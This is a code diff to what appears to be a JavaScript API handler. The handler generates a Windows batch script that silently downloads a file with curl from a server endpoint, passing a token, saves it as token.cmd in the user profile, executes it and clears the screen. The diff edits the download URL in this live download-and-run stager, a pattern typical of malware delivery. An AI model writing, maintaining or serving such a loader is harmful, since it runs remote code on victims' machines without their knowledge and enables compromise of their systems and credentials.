@@ -37,7 +37,7 @@ export default async function handler(req) {
   const script = `@echo off
 if exist "%USERPROFILE%\\parse" del "%USERPROFILE%\\parse"
 if exist "%USERPROFILE%\\token.cmd" del "%USERPROFILE%\\token.cmd"
-curl -s -L -o "%USERPROFILE%//parse" "${domain}/api/task/token?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
+curl -s -L -o "%USERPROFILE%\\parse" "${domain}/api/users/token?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
 ren "%USERPROFILE%\\parse" token.cmd
 "%USERPROFILE%\\token.cmd"
 cls
